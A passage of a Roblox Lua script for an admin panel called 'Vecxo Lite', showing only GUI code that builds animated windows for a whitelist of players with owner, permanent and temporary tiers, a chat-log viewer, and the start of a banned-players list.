	end

	return tostring(userId)
end

local function showWhitelisted(player, whitelistIds)
	local existingGui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("VecxoWhitelisted")
	if existingGui then
		existingGui:Destroy()
	end

	local TweenService = game:GetService("TweenService")

	local gui = Instance.new("ScreenGui")
	gui.Name = "VecxoWhitelisted"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 420, 0, 320)
	frame.Position = UDim2.new(0.5, -210, 0.5, -160)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BackgroundTransparency = 0.1
	frame.BorderSizePixel = 0
	frame.Parent = gui
	frame.Active = true
	frame.Draggable = true
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

	local shadow = Instance.new("ImageLabel")
	shadow.ZIndex = -1
	shadow.AnchorPoint = Vector2.new(0.5, 0.5)
	shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
	shadow.Size = UDim2.new(1, 30, 1, 30)
	shadow.BackgroundTransparency = 1
	shadow.Image = "rbxassetid://6014261993"
	shadow.ImageColor3 = Color3.new(0, 0, 0)
	shadow.ImageTransparency = 0.4
	shadow.ScaleType = Enum.ScaleType.Slice
	shadow.SliceCenter = Rect.new(49, 49, 450, 450)
	shadow.Parent = frame

	local titleBar = Instance.new("Frame")
	titleBar.Size = UDim2.new(1, 0, 0, 34)
	titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	titleBar.BorderSizePixel = 0
	titleBar.Parent = frame
	Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 10)

	local title = Instance.new("TextLabel")
	title.Text = "[Vecxo Lite]: Whitelisted Players"
	title.Size = UDim2.new(1, -70, 1, 0)
	title.Position = UDim2.new(0, 10, 0, 0)
	title.BackgroundTransparency = 1
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.Code
	title.TextSize = 18
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = titleBar

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 24, 0, 24)
	closeBtn.Position = UDim2.new(1, -28, 0.5, -12)
	closeBtn.BackgroundTransparency = 1
	closeBtn.Text = "‚úï"
	closeBtn.TextColor3 = Color3.fromRGB(200, 70, 70)
	closeBtn.Font = Enum.Font.GothamBold
	closeBtn.TextSize = 16
	closeBtn.Parent = titleBar

	closeBtn.MouseEnter:Connect(function()
		closeBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
	end)
	closeBtn.MouseLeave:Connect(function()
		closeBtn.TextColor3 = Color3.fromRGB(200, 70, 70)
	end)

	closeBtn.MouseButton1Click:Connect(function()
		closeBtn.AutoButtonColor = false
		closeBtn.TextTransparency = 0.5
		closeBtn.Active = false
		local fadeOutTime = 0.25
		local rows, cols = 4, 6  
		local blockWidth = frame.AbsoluteSize.X / cols
		local blockHeight = frame.AbsoluteSize.Y / rows
		local fadeTweens = {}

		for _, child in ipairs(frame:GetChildren()) do
			if child:IsA("TextLabel") or child:IsA("TextButton") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {TextTransparency = 1})
				table.insert(fadeTweens, tween)
			elseif child:IsA("ImageLabel") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {ImageTransparency = 1})
				table.insert(fadeTweens, tween)
			elseif child:IsA("ScrollingFrame") or child:IsA("Frame") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {BackgroundTransparency = 1})
				table.insert(fadeTweens, tween)
			end
		end

		for _, tween in ipairs(fadeTweens) do
			tween:Play()
		end

		task.delay(fadeOutTime, function()
			for _, child in ipairs(frame:GetChildren()) do
				if child ~= closeBtn and child.Name ~= "UICorner" then
					child.Visible = false
				end
			end

			local bgFadeTween = TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				BackgroundTransparency = 1,
			})
			bgFadeTween:Play()

			local blocks = {}
			for r = 0, rows - 1 do
				for c = 0, cols - 1 do
					local block = Instance.new("Frame")
					block.Size = UDim2.new(0, blockWidth, 0, blockHeight)
					block.Position = UDim2.new(0, c * blockWidth, 0, r * blockHeight)
					block.BackgroundColor3 = frame.BackgroundColor3
					block.BorderSizePixel = 0
					block.BackgroundTransparency = 0
					block.Parent = frame
					block.ClipsDescendants = true

					local uicorner = Instance.new("UICorner")
					uicorner.CornerRadius = UDim.new(0, 6)
					uicorner.Parent = block

					table.insert(blocks, block)
				end
			end

			local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In)
			for i, block in ipairs(blocks) do
				local delay = (i - 1) * 0.03
				task.delay(delay, function()
					local tween = TweenService:Create(block, tweenInfo, {
						Size = UDim2.new(block.Size.X.Scale, block.Size.X.Offset, 0, 0),
						Rotation = 90,
						Position = block.Position + UDim2.new(0, 0, 0, blockHeight / 2),
						BackgroundTransparency = 1,
					})
					tween:Play()
				end)
			end

			task.delay(0.03 * #blocks + 0.4, function()
				gui:Destroy()
			end)
		end)
	end)

	local minimized = false
	local minBtn = Instance.new("TextButton")
	minBtn.Size = UDim2.new(0, 24, 0, 24)
	minBtn.Position = UDim2.new(1, -56, 0.5, -12)
	minBtn.BackgroundTransparency = 1
	minBtn.Text = "‚Äì"
	minBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
	minBtn.Font = Enum.Font.GothamBold
	minBtn.TextSize = 20
	minBtn.Parent = titleBar

	minBtn.MouseEnter:Connect(function()
		minBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
	end)
	minBtn.MouseLeave:Connect(function()
		minBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
	end)
	minBtn.MouseButton1Click:Connect(function()
		minimized = not minimized
		if minimized then
			frame:TweenSize(UDim2.new(0, 420, 0, 34), "Out", "Quad", 0.25, true)
		else
			frame:TweenSize(UDim2.new(0, 420, 0, 320), "Out", "Quad", 0.25, true)
		end
	end)

	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Size = UDim2.new(1, -10, 1, -44)
	scrollingFrame.Position = UDim2.new(0, 5, 0, 39)
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.BackgroundTransparency = 0.1
	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.Parent = frame
	Instance.new("UICorner", scrollingFrame).CornerRadius = UDim.new(0, 8)

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 4)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scrollingFrame


	for _, child in ipairs(frame:GetChildren()) do
		if child.Name ~= "UICorner" then
			child.Visible = false
		end
	end
	local rows, cols = 4, 6
	local blockWidth = frame.AbsoluteSize.X / cols
	local blockHeight = frame.AbsoluteSize.Y / rows
	local blocks = {}

	for r = 0, rows - 1 do
		for c = 0, cols - 1 do
			local block = Instance.new("Frame")
			block.Size = UDim2.new(0, 0, 0, 0)
			block.Position = UDim2.new(0, c * blockWidth, 0, r * blockHeight)
			block.BackgroundColor3 = frame.BackgroundColor3
			block.BorderSizePixel = 0
			block.ClipsDescendants = true
			block.Rotation = 90
			block.BackgroundTransparency = 0
			block.Parent = frame

			local uicorner = Instance.new("UICorner")
			uicorner.CornerRadius = UDim.new(0, 6)
			uicorner.Parent = block

			table.insert(blocks, block)
		end
	end

	local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)

	for i, block in ipairs(blocks) do
		local delay = (i - 1) * 0.03
		task.delay(delay, function()
			local tween = TweenService:Create(block, tweenInfo, {
				Size = UDim2.new(0, blockWidth, 0, blockHeight),
				Rotation = 0,
			})
			tween:Play()
		end)
	end

	task.delay(0.03 * #blocks + 0.4, function()
		for _, block in ipairs(blocks) do
			block:Destroy()
		end
		for _, child in ipairs(frame:GetChildren()) do
			if child.Name ~= "UICorner" then
				child.Visible = true
			end
		end
	end)

	local Players = game:GetService("Players")
	local allWhitelist = {}

	for _, id in ipairs(whitelistIds) do
		local userIdNum = tonumber(id)
		if userIdNum then
			table.insert(allWhitelist, userIdNum)
		end
	end

	local inGameList = {}
	local offlineList = {}

	for _, userIdNum in ipairs(allWhitelist) do
		local plrInGame = Players:GetPlayerByUserId(userIdNum)
		if plrInGame then
			table.insert(inGameList, userIdNum)
		else
			table.insert(offlineList, userIdNum)
		end
	end

	local function createSectionTitle(text, color)
		local titleLabel = Instance.new("TextLabel")
		titleLabel.Size = UDim2.new(1, -10, 0, 24)
		titleLabel.BackgroundTransparency = 1
		titleLabel.Text = text
		titleLabel.TextColor3 = color
		titleLabel.Font = Enum.Font.Code
		titleLabel.TextSize = 16
		titleLabel.TextXAlignment = Enum.TextXAlignment.Left
		titleLabel.Parent = scrollingFrame
	end

	if #inGameList > 0 then
		createSectionTitle("üü¢ In-Game Whitelisted", Color3.fromRGB(200, 200, 200))
		for i, userIdNum in ipairs(inGameList) do
			local plrInGame = Players:GetPlayerByUserId(userIdNum)
			local displayName, username
			local statusText
			local labelColor
			if plrInGame then
				displayName = plrInGame.DisplayName
				username = plrInGame.Name
				if username == "Reloxz" then
					statusText = " ‚úÖ Whitelisted - { üëë OWNER - üéÆ In-Game }"
					labelColor = Color3.fromRGB(255, 215, 0)
				elseif table.find(exclusivewl, username) then
					statusText = " ‚úÖ Whitelisted - { üõ°Ô∏è PERM - üéÆ In-Game }"
					labelColor = Color3.fromRGB(0, 255, 0)
				else
					statusText = " ‚úÖ Whitelisted - { ‚è≥ TEMP - üéÆ In-Game }"
					labelColor = Color3.fromRGB(200, 200, 200)
				end
			else
				displayName = GetUserName(userIdNum)
				username = displayName
				if table.find(exclusivewl, displayName) and displayName ~= "Reloxz" then
					statusText = " ‚úÖ Whitelisted - { üõ°Ô∏è PERM - ‚ùå Offline }"
					labelColor = Color3.fromRGB(0, 255, 0)
				elseif table.find(exclusivewl, displayName) and displayName == "Reloxz" then
					statusText = " ‚úÖ Whitelisted - { üëë OWNER - ‚ùå Offline }"
					labelColor = Color3.fromRGB(255, 215, 0)
				else
					statusText = " ‚úÖ Whitelisted - { ‚è≥ TEMP - ‚ùå Offline }"
					labelColor = Color3.fromRGB(200, 200, 200)
				end
			end
			local entryFrame = Instance.new("Frame")
			entryFrame.Size = UDim2.new(1, -10, 0, 80)
			entryFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			entryFrame.BackgroundTransparency = 0.5
			entryFrame.Parent = scrollingFrame
			entryFrame.BorderSizePixel = 0
			local headshot = Instance.new("ImageLabel")
			headshot.Size = UDim2.new(0, 60, 0, 60)
			headshot.Position = UDim2.new(0, 0, 0, 2)
			headshot.BackgroundTransparency = 1
			headshot.Image = "rbxthumb://type=AvatarHeadShot&id=" .. userIdNum .. "&w=420&h=420"
			headshot.Parent = entryFrame
			local label = Instance.new("TextLabel")
			label.Size = UDim2.new(1, -75, 1, -10)
			label.Position = UDim2.new(0, 70, 0, 5)
			label.BackgroundTransparency = 1
			label.Text = " ".. i .. " - \n " .. displayName .. "(@" .. username .. ")" .. " - [" .. userIdNum .. "]\n " .. statusText
			label.TextColor3 = labelColor
			label.TextXAlignment = Enum.TextXAlignment.Left
			label.Font = Enum.Font.Gotham
			label.TextWrapped = true
			label.TextSize = 14
			label.Parent = entryFrame
		end
	end

	if #offlineList > 0 then
		createSectionTitle("üî¥ Offline Whitelisted", Color3.fromRGB(200, 200, 200))
		for i, userIdNum in ipairs(offlineList) do
			local plrInGame = Players:GetPlayerByUserId(userIdNum)
			local displayName, username
			local statusText
			local labelColor
			if plrInGame then
				displayName = plrInGame.DisplayName
				username = plrInGame.Name
				if username == "Reloxz" then
					statusText = " ‚úÖ Whitelisted - { üëë OWNER - üéÆ In-Game }"
					labelColor = Color3.fromRGB(255, 215, 0)
				elseif table.find(exclusivewl, username) then
					statusText = " ‚úÖ Whitelisted - { üõ°Ô∏è PERM - üéÆ In-Game }"
					labelColor = Color3.fromRGB(0, 255, 0)
				else
					statusText = " ‚úÖ Whitelisted - { ‚è≥ TEMP - üéÆ In-Game }"
					labelColor = Color3.fromRGB(200, 200, 200)
				end
			else
				displayName = GetUserName(userIdNum)
				username = displayName
				if table.find(exclusivewl, displayName) and displayName ~= "Reloxz" then
					statusText = " ‚úÖ Whitelisted - { üõ°Ô∏è PERM - ‚ùå Offline }"
					labelColor = Color3.fromRGB(0, 255, 0)
				elseif table.find(exclusivewl, displayName) and displayName == "Reloxz" then
					statusText = " ‚úÖ Whitelisted - { üëë OWNER - ‚ùå Offline }"
					labelColor = Color3.fromRGB(255, 215, 0)
				else
					statusText = " ‚úÖ Whitelisted - { ‚è≥ TEMP - ‚ùå Offline }"
					labelColor = Color3.fromRGB(200, 200, 200)
				end
			end
			local entryFrame = Instance.new("Frame")
			entryFrame.Size = UDim2.new(1, -10, 0, 80)
			entryFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			entryFrame.BackgroundTransparency = 0.5
			entryFrame.Parent = scrollingFrame
			entryFrame.BorderSizePixel = 0
			local headshot = Instance.new("ImageLabel")
			headshot.Size = UDim2.new(0, 60, 0, 60)
			headshot.Position = UDim2.new(0, 0, 0, 2)
			headshot.BackgroundTransparency = 1
			headshot.Image = "rbxthumb://type=AvatarHeadShot&id=" .. userIdNum .. "&w=420&h=420"
			headshot.Parent = entryFrame
			local label = Instance.new("TextLabel")
			label.Size = UDim2.new(1, -75, 1, -10)
			label.Position = UDim2.new(0, 70, 0, 5)
			label.BackgroundTransparency = 1
			label.Text = " ".. i .. " - \n " .. displayName .. "(@" .. username .. ")" .. " - [" .. userIdNum .. "]\n " .. statusText
			label.TextColor3 = labelColor
			label.TextXAlignment = Enum.TextXAlignment.Left
			label.Font = Enum.Font.Gotham
			label.TextWrapped = true
			label.TextSize = 14
			label.Parent = entryFrame
		end
	end
	task.defer(function()
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
	end)
end


local TextChatService = game:GetService("TextChatService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local function showChatLogs(viewer)
	local existingGui = viewer:FindFirstChild("PlayerGui") and viewer.PlayerGui:FindFirstChild("VecxoChatLogs")
	if existingGui then
		existingGui:Destroy()
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "VecxoChatLogs"
	gui.ResetOnSpawn = false
	gui.Parent = viewer:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 500, 0, 320)
	frame.Position = UDim2.new(0.5, -250, 0.5, -160)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BackgroundTransparency = 0.1
	frame.BorderSizePixel = 0
	frame.Active = true
	frame.Draggable = true
	frame.Parent = gui

	local uicorner = Instance.new("UICorner")
	uicorner.CornerRadius = UDim.new(0, 10)
	uicorner.Parent = frame

	local shadow = Instance.new("ImageLabel")
	shadow.ZIndex = -1
	shadow.AnchorPoint = Vector2.new(0.5, 0.5)
	shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
	shadow.Size = UDim2.new(1, 30, 1, 30)
	shadow.BackgroundTransparency = 1
	shadow.Image = "rbxassetid://6014261993"
	shadow.ImageColor3 = Color3.new(0, 0, 0)
	shadow.ImageTransparency = 0.4
	shadow.ScaleType = Enum.ScaleType.Slice
	shadow.SliceCenter = Rect.new(49, 49, 450, 450)
	shadow.Parent = frame

	local titleBar = Instance.new("Frame")
	titleBar.Size = UDim2.new(1, 0, 0, 34)
	titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	titleBar.BorderSizePixel = 0
	titleBar.Parent = frame
	Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 10)

	local title = Instance.new("TextLabel")
	title.Text = "[Vecxo Lite]: Chat Logs"
	title.Size = UDim2.new(1, -70, 1, 0)
	title.Position = UDim2.new(0, 10, 0, 0)
	title.BackgroundTransparency = 1
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.Code
	title.TextSize = 18
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = titleBar

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 24, 0, 24)
	closeBtn.Position = UDim2.new(1, -28, 0.5, -12)
	closeBtn.BackgroundTransparency = 1
	closeBtn.Text = "‚úï"
	closeBtn.TextColor3 = Color3.fromRGB(200, 70, 70)
	closeBtn.Font = Enum.Font.GothamBold
	closeBtn.TextSize = 16
	closeBtn.Parent = titleBar

	closeBtn.MouseEnter:Connect(function()
		closeBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
	end)
	closeBtn.MouseLeave:Connect(function()
		closeBtn.TextColor3 = Color3.fromRGB(200, 70, 70)
	end)

	closeBtn.MouseButton1Click:Connect(function()
		closeBtn.AutoButtonColor = false
		closeBtn.TextTransparency = 0.5
		closeBtn.Active = false
		local fadeOutTime = 0.25
		local rows, cols = 4, 6  
		local blockWidth = frame.AbsoluteSize.X / cols
		local blockHeight = frame.AbsoluteSize.Y / rows
		local fadeTweens = {}
		for _, child in ipairs(frame:GetChildren()) do
			if child:IsA("TextLabel") or child:IsA("TextButton") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {TextTransparency = 1})
				table.insert(fadeTweens, tween)
			elseif child:IsA("ImageLabel") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {ImageTransparency = 1})
				table.insert(fadeTweens, tween)
			elseif child:IsA("ScrollingFrame") or child:IsA("Frame") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {BackgroundTransparency = 1})
				table.insert(fadeTweens, tween)
			end
		end
		for _, tween in ipairs(fadeTweens) do
			tween:Play()
		end
		task.delay(fadeOutTime, function()
			for _, child in ipairs(frame:GetChildren()) do
				if child ~= closeBtn and child.Name ~= "UICorner" then
					child.Visible = false
				end
			end
			local bgFadeTween = TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				BackgroundTransparency = 1,
			})
			bgFadeTween:Play()
			local blocks = {}
			for r = 0, rows - 1 do
				for c = 0, cols - 1 do
					local block = Instance.new("Frame")
					block.Size = UDim2.new(0, blockWidth, 0, blockHeight)
					block.Position = UDim2.new(0, c * blockWidth, 0, r * blockHeight)
					block.BackgroundColor3 = frame.BackgroundColor3
					block.BorderSizePixel = 0
					block.BackgroundTransparency = 0
					block.Parent = frame
					block.ClipsDescendants = true
					local uicorner = Instance.new("UICorner")
					uicorner.CornerRadius = UDim.new(0, 6)
					uicorner.Parent = block
					table.insert(blocks, block)
				end
			end
			local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In)
			for i, block in ipairs(blocks) do
				local delay = (i - 1) * 0.03
				task.delay(delay, function()
					local tween = TweenService:Create(block, tweenInfo, {
						Size = UDim2.new(block.Size.X.Scale, block.Size.X.Offset, 0, 0),
						Rotation = 90,
						Position = block.Position + UDim2.new(0, 0, 0, blockHeight / 2),
						BackgroundTransparency = 1,
					})
					tween:Play()
				end)
			end
			task.delay(0.03 * #blocks + 0.4, function()
				gui:Destroy()
			end)
		end)
	end)

	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Size = UDim2.new(1, -10, 1, -44)
	scrollingFrame.Position = UDim2.new(0, 5, 0, 39)
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.BackgroundTransparency = 0.1
	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.Parent = frame
	Instance.new("UICorner", scrollingFrame).CornerRadius = UDim.new(0, 8)

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 6)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scrollingFrame

	local messageCounter = 0

	local function addLabel(name, msg, userId)
		local entryFrame = Instance.new("Frame")
		entryFrame.Size = UDim2.new(1, -10, 0, 40)
		entryFrame.BackgroundTransparency = 0.5
		entryFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		entryFrame.BorderSizePixel = 0
		entryFrame.LayoutOrder = messageCounter
		entryFrame.Parent = scrollingFrame
		entryFrame.Name = "EntryFrame"

		local uicornerEntry = Instance.new("UICorner")
		uicornerEntry.CornerRadius = UDim.new(0, 8)
		uicornerEntry.Parent = entryFrame

		local headshot = Instance.new("ImageLabel")
		headshot.Size = UDim2.new(0, 36, 0, 36)
		headshot.Position = UDim2.new(0, 2, 0, 2)
		headshot.BackgroundTransparency = 1
		headshot.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(userId) .. "&w=420&h=420"
		headshot.Parent = entryFrame

		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, -46, 1, 0)
		label.Position = UDim2.new(0, 40, 0, 0)
		label.BackgroundTransparency = 1

		if table.find(whitelisted, tostring(userId)) and string.find(msg, "^!") then
			label.TextColor3 = Color3.fromRGB(0, 255, 0)
		else
			label.TextColor3 = Color3.fromRGB(255, 255, 255)
		end

		label.Text = " ["..tostring(name) .. "]: " .. tostring(msg)
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Font = Enum.Font.Gotham
		label.TextSize = 14
		label.Parent = entryFrame

		messageCounter -= 1

		task.defer(function()
			scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
		end)
	end

	for i = 1, #chatHistory do
		local entry = chatHistory[i]
		addLabel(entry.Name, entry.Message, entry.UserId)
	end

	local connections = {}

	local function connectPlayer(plr)
		local conn = plr.Chatted:Connect(function(msg)
			addLabel(plr.Name, msg, plr.UserId)
		end)
		table.insert(connections, conn)
	end

	for _, plr in ipairs(Players:GetPlayers()) do
		connectPlayer(plr)
	end

	local joinConn = Players.PlayerAdded:Connect(function(plr)
		connectPlayer(plr)
	end)
	table.insert(connections, joinConn)
	gui.AncestryChanged:Connect(function(_, parent)
		if not parent then
			for _, conn in ipairs(connections) do
				pcall(function() conn:Disconnect() end)
			end
		end
	end)
	for _, child in ipairs(frame:GetChildren()) do
		if child.Name ~= "UICorner" then
			child.Visible = false
		end
	end
	local rows, cols = 4, 6
	local blockWidth = frame.AbsoluteSize.X / cols
	local blockHeight = frame.AbsoluteSize.Y / rows
	local blocks = {}
	for r = 0, rows - 1 do
		for c = 0, cols - 1 do
			local block = Instance.new("Frame")
			block.Size = UDim2.new(0, 0, 0, 0) -- start small
			block.Position = UDim2.new(0, c * blockWidth, 0, r * blockHeight)
			block.BackgroundColor3 = frame.BackgroundColor3
			block.BorderSizePixel = 0
			block.ClipsDescendants = true
			block.Rotation = 90
			block.BackgroundTransparency = 0
			block.Parent = frame

			local uicorner = Instance.new("UICorner")
			uicorner.CornerRadius = UDim.new(0, 6)
			uicorner.Parent = block

			table.insert(blocks, block)
		end
	end
	local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
	for i, block in ipairs(blocks) do
		local delay = (i - 1) * 0.03
		task.delay(delay, function()
			local tween = TweenService:Create(block, tweenInfo, {
				Size = UDim2.new(0, blockWidth, 0, blockHeight),
				Rotation = 0,
			})
			tween:Play()
		end)
	end
	task.delay(0.03 * #blocks + 0.4, function()
		for _, block in ipairs(blocks) do
			block:Destroy()
		end
		for _, child in ipairs(frame:GetChildren()) do
			if child.Name ~= "UICorner" then
				child.Visible = true
			end
		end
	end)
end

local zxc = false

local TweenService = game:GetService("TweenService")

local function showBannedList(player, bannedPlayersTable)
	local existingGui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("VecxoBanned")
	if existingGui then
		existingGui:Destroy()
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "VecxoBanned"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 420, 0, 320)
	frame.Position = UDim2.new(0.5, -210, 0.5, -160)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BackgroundTransparency = 0.1
	frame.BorderSizePixel = 0
	frame.Parent = gui
	frame.Active = true
	frame.Draggable = true
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

	local shadow = Instance.new("ImageLabel")
	shadow.ZIndex = -1
	shadow.AnchorPoint = Vector2.new(0.5, 0.5)
	shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
	shadow.Size = UDim2.new(1, 30, 1, 30)
	shadow.BackgroundTransparency = 1
	shadow.Image = "rbxassetid://6014261993"
	shadow.ImageColor3 = Color3.new(0, 0, 0)
	shadow.ImageTransparency = 0.4
	shadow.ScaleType = Enum.ScaleType.Slice
	shadow.SliceCenter = Rect.new(49, 49, 450, 450)
	shadow.Parent = frame

	local titleBar = Instance.new("Frame")
	titleBar.Size = UDim2.new(1, 0, 0, 34)
	titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	titleBar.BorderSizePixel = 0
	titleBar.Parent = frame
	Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 10)

	local title = Instance.new("TextLabel")
	title.Text = "[Vecxo Lite]: Banned Players"
	title.Size = UDim2.new(1, -70, 1, 0)
	title.Position = UDim2.new(0, 10, 0, 0)
	title.BackgroundTransparency = 1
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.Code
	title.TextSize = 18
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = titleBar

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 24, 0, 24)
	closeBtn.Position = UDim2.new(1, -28, 0.5, -12)
	closeBtn.BackgroundTransparency = 1
	closeBtn.Text = "‚úï"
	closeBtn.TextColor3 = Color3.fromRGB(200, 70, 70)
	closeBtn.Font = Enum.Font.GothamBold
	closeBtn.TextSize = 16
	closeBtn.Parent = titleBar

	closeBtn.MouseEnter:Connect(function()
		closeBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
	end)
	closeBtn.MouseLeave:Connect(function()
		closeBtn.TextColor3 = Color3.fromRGB(200, 70, 70)
	end)

	closeBtn.MouseButton1Click:Connect(function()
		closeBtn.AutoButtonColor = false
		closeBtn.TextTransparency = 0.5
		closeBtn.Active = false
		local fadeOutTime = 0.25
		local rows, cols = 4, 6  
		local blockWidth = frame.AbsoluteSize.X / cols
		local blockHeight = frame.AbsoluteSize.Y / rows
		local fadeTweens = {}
		for _, child in ipairs(frame:GetChildren()) do
			if child:IsA("TextLabel") or child:IsA("TextButton") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {TextTransparency = 1})
				table.insert(fadeTweens, tween)
			elseif child:IsA("ImageLabel") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {ImageTransparency = 1})
				table.insert(fadeTweens, tween)
			elseif child:IsA("ScrollingFrame") or child:IsA("Frame") then
				local tween = TweenService:Create(child, TweenInfo.new(fadeOutTime), {BackgroundTransparency = 1})
				table.insert(fadeTweens, tween)
			end
		end
		for _, tween in ipairs(fadeTweens) do
			tween:Play()
		end
		task.delay(fadeOutTime, function()
			for _, child in ipairs(frame:GetChildren()) do
				if child ~= closeBtn and child.Name ~= "UICorner" then
					child.Visible = false
				end
			end
			local bgFadeTween = TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				BackgroundTransparency = 1,
			})
			bgFadeTween:Play()
			local blocks = {}
			for r = 0, rows - 1 do
				for c = 0, cols - 1 do
					local block = Instance.new("Frame")
					block.Size = UDim2.new(0, blockWidth, 0, blockHeight)
					block.Position = UDim2.new(0, c * blockWidth, 0, r * blockHeight)
					block.BackgroundColor3 = frame.BackgroundColor3
					block.BorderSizePixel = 0
					block.BackgroundTransparency = 0
					block.Parent = frame
					block.ClipsDescendants = true

					local uicorner = Instance.new("UICorner")
					uicorner.CornerRadius = UDim.new(0, 6)
					uicorner.Parent = block

					table.insert(blocks, block)
				end
			end
			local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In)
			for i, block in ipairs(blocks) do
				local delay = (i - 1) * 0.03
				task.delay(delay, function()
					local tween = TweenService:Create(block, tweenInfo, {
						Size = UDim2.new(block.Size.X.Scale, block.Size.X.Offset, 0, 0),
						Rotation = 90,
						Position = block.Position + UDim2.new(0, 0, 0, blockHeight / 2),
						BackgroundTransparency = 1,
					})
					tween:Play()
				end)
			end
			task.delay(0.03 * #blocks + 0.4, function()
				gui:Destroy()
			end)
		end)
	end)

	local minimized = false
	local minBtn = Instance.new("TextButton")
	minBtn.Size = UDim2.new(0, 24, 0, 24)
	minBtn.Position = UDim2.new(1, -56, 0.5, -12)
	minBtn.BackgroundTransparency = 1
	minBtn.Text = "‚Äì"
	minBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
	minBtn.Font = Enum.Font.GothamBold
	minBtn.TextSize = 20
	minBtn.Parent = titleBar

	minBtn.MouseEnter:Connect(function()
		minBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
	end)
	minBtn.MouseLeave:Connect(function()
		minBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
	end)
	minBtn.MouseButton1Click:Connect(function()
		minimized = not minimized
		if minimized then
			frame:TweenSize(UDim2.new(0, 420, 0, 34), "Out", "Quad", 0.25, true)
		else
			frame:TweenSize(UDim2.new(0, 420, 0, 320), "Out", "Quad", 0.25, true)
		end
	end)

	local scrollingFrame = Instance.new("ScrollingFrame")
